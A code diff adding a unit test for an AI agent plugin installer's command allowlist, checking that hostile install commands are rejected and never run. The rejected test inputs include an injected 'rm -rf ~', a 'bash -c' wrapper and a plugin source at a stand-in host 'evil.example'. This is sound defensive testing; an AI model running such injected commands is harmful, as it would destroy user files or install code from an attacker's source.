@@ -251,3 +251,14 @@ def test_install_then_uninstall_round_trip(tmp_path):
     assert p.returncode == 0, p.stderr
     assert not (user / ".codex" / "hooks.json").exists() and not (user / ".agents" / "skills").exists() or \
         not os.listdir(user / ".agents" / "skills")
+
+
+def test_only_plain_plugin_commands_are_ever_run():
+    from nodaris_harness import onboard
+    ok = ["claude plugin marketplace add NodarisAI/Nodaris-Memory-Vault", "claude plugin install nodaris-context@nodaris --scope user"]
+    bad = ["claude plugin install x@y --scope user; rm -rf ~", "claude plugin install --config=evil x --scope user",
+           "claude plugin marketplace add https://evil.example/x.git --foo", "bash -c 'claude plugin install x'"]
+    assert all(onboard._allowed_install(c) for c in ok)
+    assert not any(onboard._allowed_install(c) for c in bad)
+    ran = []
+    assert onboard.install_plugin({"install": bad[:1]}, runner=lambda *a, **k: ran.append(a)) is False and ran == []
